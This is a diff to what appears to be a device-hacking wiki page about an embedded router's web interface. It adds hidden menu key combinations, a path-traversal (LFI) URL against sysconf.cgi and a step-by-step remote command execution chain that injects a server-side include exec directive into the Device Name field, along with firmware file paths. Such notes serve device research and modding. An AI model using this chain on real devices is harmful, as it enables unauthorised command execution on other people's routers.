@@ -1,3 +1,17 @@
-Engineering Menu: move your mouse over the device image, then hold ctrl+shift+e and click
+== WebUI Tricks ==
+  * Engineering Menu: move your mouse over the device image, then hold ctrl+shift+e and click
+  * Software Menu: move your mouse over the device image, then hold ctrl+alt+h
+  * LFI: http://192.168.15.1/cgi-bin/sysconf.cgi?page=../../<afile>&action=request&sid=<sid from a valid request>&timestamp=<valid timestamp>
 
-Software Menu: move your mouse over the device image, then hold ctrl+alt+h
+== Remote Command Execution ==
+  # load up TamperData, Charles, or some other tampering proxy
+  # log into the device and change the Basic->Device Name to FOO
+  # in your tampering proxy, change FOO to <!--#exec cmd="<your command>" -->
+  # using the LFI above, get /etc/hosts
+  # your command will be run, and you should see your results
+
+== Filesystem ==
+  * /mnt/jffs2/conf/app/lighttpd.conf
+  * /mnt/jffs2/conf/app/ipkg.conf
+  * /bin/ipkg_verify.sh
+  * /etc/conf/app/pubkey
